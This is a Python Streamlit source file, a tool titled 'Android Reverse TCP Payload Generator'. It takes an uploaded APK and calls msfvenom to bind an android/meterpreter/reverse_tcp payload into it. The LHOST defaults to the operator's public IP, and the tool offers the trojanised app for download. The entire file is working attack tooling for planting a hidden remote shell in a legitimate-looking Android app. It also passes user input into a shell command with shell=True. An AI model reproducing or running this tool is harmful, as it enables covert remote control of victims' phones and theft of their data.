import streamlit as st
import subprocess
import os
import re
import requests

def is_valid_ip(ip):
    # Simple regex-based IP address validation
    return bool(re.match(r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", ip))

def generate_payload(ip, port, output_file, apk_path):
    if not is_valid_ip(ip):
        st.error("Invalid IP address format.")
        return
    
    if not output_file:
        output_file = "payload"

    command = f"msfvenom -x {apk_path} -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file}.apk"

    progress_text = st.empty()
    progress_text.warning("Building payload...")

    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
        
        for line in process.stdout:
            progress_text.success(line.strip())

        _, _ = process.communicate()

        if process.returncode == 0:
            progress_text.success("Payload generated successfully!")
            with open(f"{output_file}.apk", "rb") as f:
                payload_data = f.read()
            st.download_button(label="Download Payload", data=payload_data, file_name=output_file + ".apk")
            # Clean up the generated APK file
            os.remove(f"{output_file}.apk")
        else:
            st.error("Error occurred while generating payload.")
    except Exception as ex:
        st.error(f"An error occurred: {ex}")
    finally:
        progress_text.empty()

st.title("Android Reverse TCP Payload Generator")

public_ip = requests.get('https://api.ipify.org').text
ip = st.text_input("Enter IP Address:", value=public_ip)
port = st.number_input("Enter Port:", min_value=1, max_value=65535, value=8080)
output_file = "payload"

uploaded_file = st.file_uploader("Upload APK file to bind", type=["apk"])

if st.button("Generate Payload") and uploaded_file is not None:
    try:
        temp_file_path = "temp.apk"
        with open(temp_file_path, "wb") as f:
            f.write(uploaded_file.getvalue())
        generate_payload(ip, port, output_file, temp_file_path)
    finally:
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)
